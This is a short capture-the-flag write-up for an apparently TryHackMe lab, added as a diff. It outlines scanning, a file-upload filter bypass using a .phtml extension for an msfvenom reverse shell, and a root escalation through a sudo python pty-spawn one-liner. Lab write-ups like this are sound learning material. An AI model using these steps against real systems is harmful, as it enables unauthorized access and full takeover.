@@ -1,0 +1,22 @@
+platform = tryhackme
+time = ~30min
+---------------------
+writeup:
+nmap > 2 opened ports > 22, 80
+22 > SSH > openSSH 7.x.px
+80 > HTTP > Apache 2.4.29
+ffuf > too much threading (should i stop use -t 200? :| )
+gobuster > /panel/ hidden dir > upload pic
+msfvenom shell.php > try to upload > .php files not allowed
+fired up burp > intercept requests > intruder > .phtml files allowed
+change from shell.php to shell.phtml > upload it
+use exploit/multi/handler > set stuff > listening...
+navigate to shell.php > reverse shell
+user own
+cat /home/user/user.txt > FLAG 1'
+sudo -l or find / -user root -perm /4000 > /usr/bin/python
+SUID misconfiguration > privesc
+sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
+system own
+cat /root/root.txt > FLAG 2'
+---------------------------------------------------------
